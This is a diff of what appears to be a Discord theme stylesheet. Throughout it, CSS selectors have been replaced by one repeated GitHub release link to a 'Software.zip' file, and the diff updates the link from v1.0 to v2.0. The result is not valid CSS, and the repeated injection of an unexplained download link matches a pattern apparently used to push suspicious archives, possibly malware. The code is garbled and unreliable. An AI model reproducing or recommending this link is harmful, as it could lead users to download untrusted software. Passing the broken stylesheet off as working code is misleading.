     border: 3px outset #61A5D8;
 }
@@ -2443,7 +2443,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
 }
 
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white!important;
     background-color: #d41010 !important;
     border: 2px outset #d41010 !important;
@@ -2459,7 +2459,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     margin-top: -2px !important;
 }
   
-.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     width: 650px;
     height: 450px;
 }
@@ -2494,13 +2494,13 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border-color: #76AAD9;
     box-shadow: none;
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: var(--text-normal);
 }
 .reactionTooltipText-3OhRFp a {
     color: gold;
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, 
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, 
 .interactiveCard-2iMtdk:active, .interactiveCard-2iMtdk:hover {
     border: 2px solid black;
 }
@@ -2517,7 +2517,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
 .header-1Uy0p6:hover:not(.headerBorder-jrk0Ic) {
     border: 2px solid #76AAD9;
 }
-.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(97, 165, 216, .7);
     -webkit-transform: none;
     transform: none;
@@ -2540,10 +2540,10 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     background-color: rgba(97, 165, 216, .5);
     border: 2px solid transparent;
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip(.disabled-3Rezaw):hover {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip(.disabled-3Rezaw):hover {
     background-color: rgba(118, 170, 217, .5);
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-color: #76AAD9;
 }
 /* Title of Post */
@@ -2563,7 +2563,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0,0,0,.55);
     border: 3px outset #242424;
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: rgba(97, 164, 216, .48);
     border: 3px inset #61a5d8;
 }
@@ -2661,7 +2661,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border-top: none;
     color: gold;
 }
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-attachment: fixed;
     background-image: -webkit-repeating-linear-gradient(-48deg, #000000 30%, #1a1a1a 35%);
     border-radius: 4px;
@@ -2672,13 +2672,13 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
 	border-radius: 5px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-radius: 5px;
     background-color: rgba(97, 165, 216, .5);
     border: 2px solid transparent;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(118, 170, 217, .5);
     border-color: #76AAD9;
 }
@@ -2851,23 +2851,23 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
 }
 
 #app-mount .avatarWrapper-eenWra .wrapper-3Un6-K foreignObject[mask*=mobile] + rect,
-#app-mount https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip foreignObject[mask*=mobile] + rect {
+#app-mount https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip foreignObject[mask*=mobile] + rect {
   fill: black;
 }
 
 #app-mount .avatarWrapper-eenWra .wrapper-3Un6-K foreignObject[mask*=mobile] ~ .pointerEvents-2KjWnj,
-#app-mount https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip foreignObject[mask*=mobile] ~ .pointerEvents-2KjWnj {
+#app-mount https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip foreignObject[mask*=mobile] ~ .pointerEvents-2KjWnj {
   mask: url("#svg-mask-status-online-mobile");
   fill: #3BA53B !important;
 }
 
-.avatarWrapper-eenWra circle, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip circle {
+.avatarWrapper-eenWra circle, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip circle {
     fill: black;
     opacity: 1 !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, 
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
   color: white!important;
 }
 
@@ -3155,7 +3155,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: #FFDB4D;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #FFDB4D !important;
     color: black !important;
 }
@@ -3166,8 +3166,8 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: #F42626;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #F42626 !important; 
     color: white;
 }
@@ -3178,8 +3178,8 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: #3DD828;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #3DD828 !important;
     color: white;
 }
@@ -3466,12 +3466,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0, 0, 0, .09);
 }
 
-.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, 
-.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, 
+.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-bottom-color: #EAD2C6;
 }
 
-.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-bottom-color: silver;
 }
 
@@ -3498,7 +3498,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0, 0, 0, .2);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0,0,0,.6);
 }
 
@@ -3539,7 +3539,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
    border-radius: 5px 5px 0 0;
    border: 2px solid rgba(255,255,255,.2);
 }
@@ -3703,7 +3703,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
 .ruleIconContainer-dXW56-,
 .stepCountIcon-1A2Rxd,
 .channelRowLabel-2yYGtY,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
 .collapseable-1FiLab:active {
     background-color: rgba(255, 255, 255, .1);
 }
@@ -3722,8 +3722,8 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0, 0, 0, .1);
 }
 
@@ -3853,7 +3853,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0, 0, 0, .1);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(225, 225, 225, .7);
 }
 
@@ -3998,7 +3998,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(255, 255, 255, .2);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border: 2px solid black;
     background-color: rgba(0, 0, 0, .2);
 }
